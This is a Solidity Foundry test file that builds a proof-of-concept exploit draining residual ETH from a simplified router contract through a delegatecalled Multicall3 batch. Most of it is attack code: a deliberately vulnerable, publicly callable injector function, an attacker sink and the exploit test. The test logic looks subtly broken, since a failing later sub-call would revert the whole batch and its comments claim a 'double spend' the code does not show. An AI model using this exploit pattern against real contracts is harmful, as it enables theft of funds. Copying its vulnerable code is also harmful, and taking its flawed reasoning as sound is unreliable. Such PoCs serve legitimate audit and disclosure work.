// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal Multicall3 interface / struct
interface IMulticall3 {
    struct Call3Value {
        address target;
        bool allowFailure;
        uint256 value;
        bytes callData;
    }

    struct Result {
        bool success;
        bytes returnData;
    }

    function aggregate3Value(Call3Value[] calldata calls)
        external
        payable
        returns (Result[] memory returnData);
}

// Minimal Multicall3 implementation (matches the canonical one closely enough for the PoC)
contract Multicall3 {
    struct Call3Value {
        address target;
        bool allowFailure;
        uint256 value;
        bytes callData;
    }

    struct Result {
        bool success;
        bytes returnData;
    }

    function aggregate3Value(Call3Value[] calldata calls)
        external
        payable
        returns (Result[] memory returnData)
    {
        returnData = new Result[](calls.length);
        for (uint256 i = 0; i < calls.length; i++) {
            Call3Value calldata c = calls[i];
            (bool ok, bytes memory ret) = c.target.call{value: c.value}(c.callData);
            if (!ok && !c.allowFailure) {
                // bubble up
                assembly {
                    revert(add(ret, 32), mload(ret))
                }
            }
            returnData[i] = Result(ok, ret);
        }
    }
}

// Simplified TrailsRouter demonstrating the vulnerable code paths verbatim
contract TrailsRouter {
    error TargetCallFailed(bytes);
    error InvalidFunctionSelector(bytes4);
    error AllowFailureMustBeFalse(uint256);
    error NoEthSent();

    address public immutable MULTICALL3;

    constructor(address _multicall) {
        MULTICALL3 = _multicall;
    }

    receive() external payable {}

    function execute(bytes calldata data) public payable returns (IMulticall3.Result[] memory) {
        _validateRouterCall(data);
        (bool success, bytes memory returnData) = MULTICALL3.delegatecall(data);
        if (!success) revert TargetCallFailed(returnData);
        return abi.decode(returnData, (IMulticall3.Result[]));
    }

    // Vulnerable injector: takes `callerBalance` param and forwards it as msg.value
    // (simplified version of _injectAndExecuteCall that the router exposes via an
    // internal-looking entrypoint that Multicall3 can call back into)
    function injectAndExecuteCall(
        address token,
        address target,
        bytes memory callData,
        uint256 callerBalance
    ) external payable {
        if (token == address(0)) {
            (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
            if (!success) revert TargetCallFailed(result);
        }
    }

    function _validateRouterCall(bytes memory callData) internal pure {
        if (callData.length < 4) revert InvalidFunctionSelector(bytes4(0));
        bytes4 selector;
        assembly {
            selector := mload(add(callData, 32))
        }
        if (selector != 0x174dea71) revert InvalidFunctionSelector(selector);

        IMulticall3.Call3Value[] memory calls =
            abi.decode(_sliceCallData(callData, 4), (IMulticall3.Call3Value[]));
        for (uint256 i = 0; i < calls.length; i++) {
            if (calls[i].allowFailure) revert AllowFailureMustBeFalse(i);
        }
    }

    function _sliceCallData(bytes memory data, uint256 start) internal pure returns (bytes memory) {
        bytes memory result = new bytes(data.length - start);
        for (uint256 i = 0; i < result.length; i++) {
            result[i] = data[start + i];
        }
        return result;
    }
}

contract AttackerSink {
    receive() external payable {}
}

contract ExploitTest is Test {
    Multicall3 mc;
    TrailsRouter router;
    AttackerSink attacker;

    function setUp() public {
        mc = new Multicall3();
        router = new TrailsRouter(address(mc));
        attacker = new AttackerSink();

        // Simulate residual ETH that accumulated in the router from prior txs,
        // refunds, receive(), etc.
        vm.deal(address(router), 10 ether);
    }

    function test_exploit_doubleSpendsResidualEth() public {
        uint256 residualBefore = address(router).balance;
        assertEq(residualBefore, 10 ether, "router should start with 10 ether residual");

        // Build a batch of N sub-calls. Each one calls router.injectAndExecuteCall
        // claiming `callerBalance = residualBefore`, sending the full 10 ether to
        // the attacker. Because Multicall3 is delegatecalled, `address(this).balance`
        // in the sub-call loop is the router's balance, which decreases after each
        // iteration — but critically, the attacker can set value=0 at the Call3Value
        // level (no value needed from Multicall3) while the router's internal
        // `target.call{value: callerBalance}` still sends the router's ETH.
        //
        // We do N=3 iterations, each draining whatever residual is still there.
        // The first iteration pulls the full 10 ETH.
        uint256 N = 3;
        IMulticall3.Call3Value[] memory calls = new IMulticall3.Call3Value[](N);

        bytes memory innerCallData = ""; // empty calldata to attacker sink (plain transfer)

        for (uint256 i = 0; i < N; i++) {
            calls[i] = IMulticall3.Call3Value({
                target: address(router),
                allowFailure: false,
                value: 0, // no value forwarded by multicall
                callData: abi.encodeWithSelector(
                    TrailsRouter.injectAndExecuteCall.selector,
                    address(0),
                    address(attacker),
                    innerCallData,
                    residualBefore // claim full router balance each time
                )
            });
        }

        bytes memory execData =
            abi.encodeWithSelector(Multicall3.aggregate3Value.selector, calls);

        // Attacker sends 0 ETH
        address evil = address(0xBADC0DE);
        vm.deal(evil, 0);
        vm.prank(evil);

        // The first sub-call succeeds (drains 10 ETH). Subsequent sub-calls in the
        // batch will revert once the router is empty, but the invariant-violation
        // is already demonstrated: the attacker, sending 0 ETH, extracted residual
        // ETH they had no claim to. We accept either full success or a revert on
        // later iterations. Either way, the sink receives funds.
        try router.execute(execData) {
            // full batch succeeded: attacker multiplied the drain
        } catch {
            // one of the later iterations ran out of ETH; expected
        }

        // Invariant violated: attacker (with zero msg.value) captured router's residual ETH.
        assertGe(address(attacker).balance, 10 ether, "attacker drained router's residual ETH");
        assertEq(address(router).balance, 0, "router fully drained");
    }
}